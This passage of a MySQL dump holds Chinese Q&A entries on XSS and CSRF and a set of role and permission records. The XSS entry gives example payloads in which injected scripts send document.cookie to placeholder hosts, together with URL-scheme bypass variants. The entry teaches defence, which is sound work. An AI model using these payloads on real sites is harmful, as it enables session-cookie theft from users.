属性的赋值\r\n\r\n```javascript\r\n//jsp\r\n<a href=\"escape(<%= getParameter(\"newUrl\") %>)\">跳转...</a>\r\n```\r\n\r\n访问\r\n\r\n```javascript\r\nhttp://xxx.xxx.xxx?newUrl=javascript:alert(\'XSS\')    //点击 a 标签就会弹出 XSS 字样\r\n变换大小写\r\nhttp://xxx.xxx.xxx?newUrl=JAvaScript:alert(\'XSS\')    //点击 a 标签就会弹出 XSS 字样\r\n加空格\r\nhttp://xxx.xxx.xxx?newUrl= JavaScript :alert(\'XSS\')    //点击 a 标签就会弹出 XSS 字样\r\n```\r\n\r\n\r\n\r\n- image 标签 src 属性，onload、onerror、onclick 事件中注入恶意代码\r\n\r\n```javascript\r\n<img src=\'xxx.xxx\' onerror=\'javascript:window.open(\"http://aaa.xxx?param=\"+document.cookie)\' />\r\n```\r\n\r\n\r\n\r\n**2、Stored XSS：存储式XSS漏洞**\r\n\r\n```javascript\r\n<form action=\"save.do\">\r\n	<input name=\"content\" value=\"\">\r\n</form>\r\n```\r\n\r\n输入 <script>window.open(\"xxx.aaa.xxx?param=\"+document.cookie)</script>，提交\r\n 当别人访问到这个页面时，就会把页面的 cookie 提交到 xxx.aaa.xxx，攻击者就可以获取到 cookie\r\n\r\n\r\n\r\n**预防思路** \r\n\r\n- web 页面中可由用户输入的地方，如果对输入的数据转义、过滤处理\r\n- 后台输出页面的时候，也需要对输出内容进行转义、过滤处理（因为攻击者可能通过其他方式把恶意脚本写入数据库）\r\n- 前端对 html 标签属性、css 属性赋值的地方进行校验\r\n\r\n\r\n\r\n**注意：**\r\n\r\n各种语言都可以找到 escapeHTML() 方法可以转义 html 字符。\r\n\r\n```javascript\r\n<script>window.open(\"xxx.aaa.xxx?param=\"+document.cookie)</script>\r\n转义后\r\n%3Cscript%3Ewindow.open%28%22xxx.aaa.xxx%3Fparam%3D%22+document.cookie%29%3C/script%3E\r\n```\r\n\r\n需要考虑项目中的一些要求，比如转义会加大存储。可以考虑自定义函数，部分字符转义。\r\n\r\n\r\n\r\n详细可以参考：\r\n\r\n- [XSS攻击及防御](https://blog.csdn.net/ghsau/article/details/17027893)\r\n- [前端安全系列（一）：如何防止XSS攻击？](https://tech.meituan.com/2018/09/27/fe-security.html)\r\n- [浅谈XSS攻击的那些事（附常用绕过姿势）](https://zhuanlan.zhihu.com/p/26177815)\r\n\r\n', 2, 0, 1, 1, '2023-04-13 00:48:23', '2023-04-13 00:48:22');
INSERT INTO `b_question` VALUES (3, 7, 1, '什么是CSRF攻击，如何避免？\r\n', '<hr />\n<p><strong>CSRF：Cross Site Request Forgery（跨站点请求伪造）。</strong><br />\nCSRF 攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。</p>\n<p><strong>避免方法：</strong></p>\n<ul>\n<li>CSRF 漏洞进行检测的工具，如 CSRFTester、CSRF Request Builder…</li>\n<li>验证 HTTP Referer 字段</li>\n<li>添加并验证 token</li>\n<li>添加自定义 http 请求头</li>\n<li>敏感操作添加验证码</li>\n<li>使用 post 请求</li>\n</ul>\n<p>参考：</p>\n<ul>\n<li><a href=\"https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html\" target=\"_blank\">CSRF 攻击实例</a></li>\n</ul>\n', '\r\n------\r\n\r\n\r\n\r\n**CSRF：Cross Site Request Forgery（跨站点请求伪造）。**\r\n CSRF 攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。\r\n\r\n\r\n\r\n**避免方法：**\r\n\r\n- CSRF 漏洞进行检测的工具，如 CSRFTester、CSRF Request Builder...\r\n- 验证 HTTP Referer 字段\r\n- 添加并验证 token\r\n- 添加自定义 http 请求头\r\n- 敏感操作添加验证码\r\n- 使用 post 请求\r\n\r\n\r\n\r\n参考：\r\n\r\n- [CSRF 攻击实例](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html)\r\n\r\n', 3, 0, 1, 1, '2023-04-13 00:48:23', '2023-04-13 00:48:22');

-- ----------------------------
-- Table structure for b_role
-- ----------------------------
DROP TABLE IF EXISTS `b_role`;
CREATE TABLE `b_role`  (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '主键ID',
  `code` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '角色编码',
  `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '角色名称',
  `remarks` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '角色描述',
  `created_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '系统管理-角色表 ' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_role
-- ----------------------------
INSERT INTO `b_role` VALUES (1, 'admin', '管理员', '系统管理员', '2023-04-20 15:51:56', '2023-04-20 18:03:34');
INSERT INTO `b_role` VALUES (2, 'user', '用户', '用户', '2023-04-20 07:01:39', '2023-04-20 07:01:39');
INSERT INTO `b_role` VALUES (5, 'test', '演示', '演示账号', '2023-04-20 12:23:25', '2023-04-20 18:03:43');

-- ----------------------------
-- Table structure for b_role_menu
-- ----------------------------
DROP TABLE IF EXISTS `b_role_menu`;
CREATE TABLE `b_role_menu`  (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `role_id` int(10) NULL DEFAULT NULL COMMENT '角色ID',
  `menu_id` int(10) NULL DEFAULT NULL COMMENT '菜单ID',
  `created_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `last_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `role_id`(`role_id`, `menu_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 12359 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '系统管理 - 角色-权限资源关联表 ' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_role_menu
-- ----------------------------
INSERT INTO `b_role_menu` VALUES (11964, 5, 3, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11965, 5, 4, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11966, 5, 185, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11967, 5, 9, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11968, 5, 12, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11969, 5, 15, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11970, 5, 24, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11971, 5, 25, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11972, 5, 182, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11973, 5, 183, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11974, 5, 184, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11975, 5, 28, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11976, 5, 32, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11977, 5, 215, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11978, 5, 36, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11979, 5, 38, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11980, 5, 224, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11981, 5, 225, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11982, 5, 52, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11983, 5, 187, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11984, 5, 218, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11985, 5, 66, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11986, 5, 67, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11987, 5, 248, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11988, 5, 261, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11989, 5, 165, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11990, 5, 166, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11991, 5, 265, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11992, 5, 269, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11993, 5, 270, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11994, 5, 48, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11995, 5, 257, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11996, 5, 267, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11997, 5, 232, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11998, 5, 233, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (11999, 5, 238, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12000, 5, 1, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12001, 5, 2, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12002, 5, 8, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12003, 5, 14, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12004, 5, 26, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12005, 5, 27, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12006, 5, 35, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12007, 5, 223, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12008, 5, 41, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12009, 5, 51, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12010, 5, 186, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12011, 5, 217, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12012, 5, 63, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12013, 5, 164, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12014, 5, 245, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12015, 5, 47, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12016, 5, 256, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12017, 5, 266, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12018, 5, 249, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12019, 5, 231, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12020, 5, 237, '2023-04-09 19:05:31', '2023-04-09 19:05:31');
INSERT INTO `b_role_menu` VALUES (12190, 1, 1, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12191, 1, 2, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12192, 1, 3, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12193, 1, 4, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12194, 1, 5, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12195, 1, 6, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12196, 1, 7, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12197, 1, 185, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12198, 1, 8, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12199, 1, 9, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12200, 1, 10, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12201, 1, 11, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12202, 1, 12, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12203, 1, 13, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12204, 1, 14, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12205, 1, 15, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12206, 1, 16, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12207, 1, 17, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12208, 1, 18, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12209, 1, 19, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12210, 1, 20, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12211, 1, 21, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12212, 1, 22, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12213, 1, 23, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12214, 1, 24, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12215, 1, 25, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12216, 1, 182, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12217, 1, 183, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12218, 1, 184, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12219, 1, 26, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12220, 1, 27, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12221, 1, 28, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12222, 1, 29, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12223, 1, 30, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12224, 1, 31, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12225, 1, 32, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12226, 1, 33, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12227, 1, 215, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12228, 1, 253, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12229, 1, 262, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12230, 1, 271, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12231, 1, 35, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12232, 1, 36, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12233, 1, 37, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12234, 1, 38, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12235, 1, 39, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12236, 1, 40, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12237, 1, 189, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12238, 1, 216, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12239, 1, 223, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12240, 1, 224, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12241, 1, 225, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12242, 1, 226, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12243, 1, 227, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12244, 1, 228, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12245, 1, 229, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12246, 1, 230, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12247, 1, 41, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12248, 1, 51, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12249, 1, 52, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12250, 1, 53, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12251, 1, 54, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12252, 1, 55, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12253, 1, 254, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12254, 1, 169, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12255, 1, 170, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12256, 1, 173, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12257, 1, 174, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12258, 1, 176, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12259, 1, 177, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12260, 1, 171, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12261, 1, 172, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12262, 1, 175, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12263, 1, 178, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12264, 1, 179, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12265, 1, 180, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12266, 1, 181, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12267, 1, 186, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12268, 1, 187, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12269, 1, 188, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12270, 1, 217, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12271, 1, 218, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12272, 1, 219, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12273, 1, 220, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12274, 1, 221, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12275, 1, 56, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12276, 1, 57, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12277, 1, 58, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12278, 1, 250, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12279, 1, 59, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12280, 1, 60, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12281, 1, 251, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12282, 1, 61, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12283, 1, 62, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12284, 1, 252, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12285, 1, 63, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12286, 1, 64, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12287, 1, 65, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12288, 1, 260, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12289, 1, 66, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12290, 1, 67, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12291, 1, 248, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12292, 1, 261, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12293, 1, 164, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12294, 1, 165, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12295, 1, 166, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12296, 1, 191, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12297, 1, 192, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12298, 1, 193, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12299, 1, 194, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12300, 1, 195, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12301, 1, 196, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12302, 1, 197, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12303, 1, 198, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12304, 1, 203, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12305, 1, 199, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12306, 1, 200, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12307, 1, 201, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12308, 1, 202, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12309, 1, 263, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12310, 1, 264, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12311, 1, 265, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12312, 1, 269, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12313, 1, 270, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12314, 1, 245, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12315, 1, 47, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12316, 1, 48, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12317, 1, 49, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12318, 1, 50, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12319, 1, 246, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12320, 1, 247, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12321, 1, 256, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12322, 1, 257, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12323, 1, 258, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12324, 1, 266, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12325, 1, 267, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12326, 1, 268, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12327, 1, 249, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12328, 1, 231, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12329, 1, 232, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12330, 1, 233, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12331, 1, 234, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12332, 1, 235, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12333, 1, 236, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
